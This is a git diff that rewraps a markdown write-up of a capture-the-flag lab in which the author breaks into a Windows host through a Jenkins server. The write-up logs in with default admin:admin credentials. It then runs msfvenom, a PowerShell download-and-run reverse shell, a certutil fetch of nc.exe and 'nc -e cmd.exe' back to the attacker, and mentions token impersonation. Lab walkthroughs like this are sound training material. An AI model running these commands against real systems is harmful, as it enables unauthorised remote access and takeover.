@@ -105,20 +105,32 @@ Nmap done: 1 IP address (1 host up) scanned in 90.44 seconds
 
 MS12-020 looks interesting as it is a RCE vulnerability.
 
-However, before doing anything, one of the questions from the module asks the username and password for the login panel. Since I don't know how to get to the login page, I can use #dirbuster (or #gobuster) to see what directory paths there exist. I will use gobuster since I always struggle to use dirbuster.
+However, before doing anything, one of the questions from the module asks the
+username and password for the login panel. Since I don't know how to get to the
+login page, I can use #dirbuster (or #gobuster) to see what directory paths
+there exist. I will use gobuster since I always struggle to use dirbuster.
 
 - `gobuster dir -u <target_url> -w <path_to_wordlists>`
 	- do not forget to specify port if needed
 
-I was not able to find anything so I tried dirbuster as well. However, nothing interesting was found either here.
+I was not able to find anything so I tried dirbuster as well. However, nothing
+interesting was found either here.
 
-One thing I should have realized earlier was to access the Jenkins server page (port 8080) too. If you go to `<IP>:8080`, you will be able to see the welcome page of Jenkins. Then I searched for default credentials the Jenkins server would have. First, I tried admin:password, then admin:admin. "admin:admin" got me into the server dashboard.
+One thing I should have realized earlier was to access the Jenkins server page
+(port 8080) too. If you go to `<IP>:8080`, you will be able to see the welcome
+page of Jenkins. Then I searched for default credentials the Jenkins server
+would have. First, I tried admin:password, then admin:admin. "admin:admin" got
+me into the server dashboard.
 
 The hint suggest that I should look into the configuration tab under 'project' at the bottom of the index page.
 
 ![jenkins-index-page](https://joonkim0625.github.io/images/jenkins-index-page.png)
 
-After inspecting the current project, under "Build" section, you can enter Windows shell command so it can be executed! If we write our custom shell command so that we can start a reverse shell, we will be able to access the server machine. So, we will create a reverse shell using `msfvenom` and upload it onto the target machine.
+After inspecting the current project, under "Build" section, you can enter
+Windows shell command so it can be executed! If we write our custom shell
+command so that we can start a reverse shell, we will be able to access the
+server machine. So, we will create a reverse shell using `msfvenom` and upload
+it onto the target machine.
 
 `msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=<IP> LPORT=<port>`
 
@@ -131,15 +143,23 @@ And we will put the powershell command that uploads the reverse shell onto the s
 powershell iex(New-Object Net.WebClient).DownloadString('http://<IP>:<port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attacker's IP> -Port <attacker's Port>
 ```
 
-	- this should be followed by opening a listener using `nc`
-	- the address in the downloadstring portion must be your python server
-	- attacker's port must match 'nc' listener's port number
+- this should be followed by opening a listener using `nc`
+- the address in the downloadstring portion must be your python server
+- attacker's port must match 'nc' listener's port number
 
-Once you put that command into the build section, come back to the main page and click the greenish icon to start the build process. After that, you will be able to see the reverse shell connection is established (if not, check the typos in the command you entered or not setting listeners up properly).
+Once you put that command into the build section, come back to the main page and
+click the greenish icon to start the build process. After that, you will be able
+to see the reverse shell connection is established (if not, check the typos in
+the command you entered or not setting listeners up properly).
 
-There is another way you can establish a connection using `nc`. Instead of uploading a shell, we can upload `nc` then manually call a reverse shell (what I mean by manually is without any help of created shell files).
+There is another way you can establish a connection using `nc`. Instead of
+uploading a shell, we can upload `nc` then manually call a reverse shell (what I
+mean by manually is without any help of created shell files).
 
-First build command we can enter is `certutil.exe -urlcache -split -f "http://<IP>:<Port>/nc.exe" %tmp%\nc.exe`. This command will put the nc program into the temp directory.  #cerutil a command-line program that can actually run some of other commands.
+First build command we can enter is `certutil.exe -urlcache -split -f
+"http://<IP>:<Port>/nc.exe" %tmp%\nc.exe`. This command will put the nc program
+into the temp directory.  `cerutil` is a command-line program that can actually run
+some of other commands.
 
 Also, you could have used the reverse shell created using `msfvenom`.
 
@@ -147,7 +167,9 @@ Then you can run `%tmp%\nc.exe <attacker's IP> <attacker's port> -e cmd.exe`
 
 ## Priv Esc
 
-Since we have access to the target machine, we need to escalate the priv. I am signed in as `alfred\bruce` right now. This module mentions `token impersonation` to gain system access!
+Since we have access to the target machine, we need to escalate the priv. I am
+signed in as `alfred\bruce` right now. This module mentions `token
+impersonation` to gain system access!
 
 ### Token Impersonation
 
@@ -436,6 +458,6 @@ account has. To get the root flag, I had to use the GUI to get to the directory
 so that I can keep continuing with the privilege that I had (I could not do it
 through the terminal - or I just did not know how to).
 
-It was very interesting to know about the token impersonation in the Windows system.
+It was very interesting to know/learn about the token impersonation in the Windows system.
 
 
